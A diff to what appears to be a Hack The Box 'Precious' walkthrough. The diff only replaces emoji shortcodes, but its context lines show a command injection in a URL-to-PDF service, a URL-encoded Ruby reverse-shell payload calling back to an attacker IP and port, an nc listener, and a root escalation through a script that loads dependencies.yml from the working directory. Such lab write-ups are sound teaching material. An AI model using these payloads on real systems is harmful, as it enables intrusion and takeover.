@@ -182,7 +182,7 @@ Then I pointed http://precious.htb at my SimpleHTTPServer, and got the expected 
 
 ![test site](test%20site.png)
 
-This got me thinking about doing some kind of script injection or maybe an XXE :thinking: So I checked the PDF's document properties:
+This got me thinking about doing some kind of script injection or maybe an XXE 🤔 So I checked the PDF's document properties:
 
 ```
 File name:
@@ -287,7 +287,7 @@ url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html%3Fname%3D%23%7B%27%2520%60sleep+
 
 *Lo and behold* we get a successful page load, generating the site PDF, after about ten seconds!
 
-:clap: Super! We already know the scripting language (Ruby), and it appears to be listening to arbitrary commands... so lets see if we can open up a reverse shell!
+👏 Super! We already know the scripting language (Ruby), and it appears to be listening to arbitrary commands... so lets see if we can open up a reverse shell!
 
 I searched [GTFObins to see if there was an easy ruby reverse shell](https://gtfobins.github.io/gtfobins/ruby/), and indeed there is:
 
@@ -322,7 +322,7 @@ http://10.10.14.7:8000/index.html?name=#{\%20`ruby -rsocket -e 'exit if fork;c=T
 url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html%3Fname%3D%23%7B%2520%60ruby+-rsocket+-e+%27exit+if+fork%3Bc%3DTCPSocket.new%28%2210.10.14.7%22%2C4444%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%22r%22%29%7B%7Cio%7Cc.print+io.read%7Dend%27%60%7D
 ```
 
-:sunglasses: and there's our reverse shell!
+🕶️ and there's our reverse shell!
 
 ```
 └─$ nc -lvnp 4444
@@ -371,9 +371,9 @@ _laurel:x:997:997::/var/log/laurel:/bin/false
 
 > Even though the box seems to have python3, I was not able to upgrade my shell using it. *No idea why.* 
 > Same with perl... *what the heck!*
-> And if I try even checking if socat is on the machine, my connection is terminated! *What the heckin' heck!?* :skull_and_crossbones: 
+> And if I try even checking if socat is on the machine, my connection is terminated! *What the heckin' heck!?* ☠️ 
 >
-> I can't even change directories with this useless shell :angry:
+> I can't even change directories with this useless shell 😠
 
 Oh well. Let's just look for the user flag and try to get past this step using the dumb shell. The flag is almost always in the foothold user's home directory:
 
@@ -457,7 +457,7 @@ henry@precious:~$
 
 ```
 
-> *Oh thank goodness* :sweat_smile: *I was so sick of that `ruby` shell.* 
+> *Oh thank goodness* 😅 *I was so sick of that `ruby` shell.* 
 
 Since `ruby` didn't have the user flag, and there are only two users on the box with a home directory, we know `henry` must have the user flag. Just `cat` it:
 
@@ -574,15 +574,15 @@ Traceback (most recent call last):
 
 ```
 
-Apparently it can't find `dependencies.yml` :thinking: Hmm... that seems a little broken. If it's not adjacent to `update_dependencies.rb`, where is it?
+Apparently it can't find `dependencies.yml` 🤔 Hmm... that seems a little broken. If it's not adjacent to `update_dependencies.rb`, where is it?
 
 ```
 henry@precious:~$ find / -name "dependencies.yml" 2>/dev/null
 /opt/sample/dependencies.yml
 ```
 
-> :thumbsup: Ah, OK. Looking over  `update_dependencies.rb` again, I see that it's using a relative path for loading `dependencies.yml`.
-> :thumbsdown: But... I don't have any way of writing to the directory from which it will load `dependecies.yml` 
+> 👍 Ah, OK. Looking over  `update_dependencies.rb` again, I see that it's using a relative path for loading `dependencies.yml`.
+> 👎 But... I don't have any way of writing to the directory from which it will load `dependecies.yml` 
 
 I'll try copying the sample file into `/home/henry` just to see what happens
 
@@ -593,7 +593,7 @@ Installed version differs from the one specified in file: yaml
 Installed version is equals to the one specified in file: pdfkit
 ```
 
-:flushed: Wait... WHAT?! No way. It actually ran? It didn't fail to find `dependencies.yml`???
+😳 Wait... WHAT?! No way. It actually ran? It didn't fail to find `dependencies.yml`???
 Ruby must have some kind of environment variable that it sets when it runs, some kind of internal PATH that includes the directory where the command was invoked from. Why on earth would it do that?
 
 ### Aside: How do filepaths work with ruby's File.read() ?
@@ -645,7 +645,7 @@ I then wrote the above into `/home/henry/dependencies.yml` and re-ran `/opt/upda
 
 Ignore the traceback: the payload `id` worked! Let's I'll modify this to open up a root shell instead of just running `id`. 
 
-So instead of running `id`, just run `bash`. Yep, it really is that simple :thumbsup:
+So instead of running `id`, just run `bash`. Yep, it really is that simple 👍
 
 ```
 ---
@@ -671,7 +671,7 @@ So instead of running `id`, just run `bash`. Yep, it really is that simple :thum
 
 ![root shell-blurred](root%20shell-blurred.png)
 
-And there's the root flag! :tada:
+And there's the root flag! 🎉
 
 
 
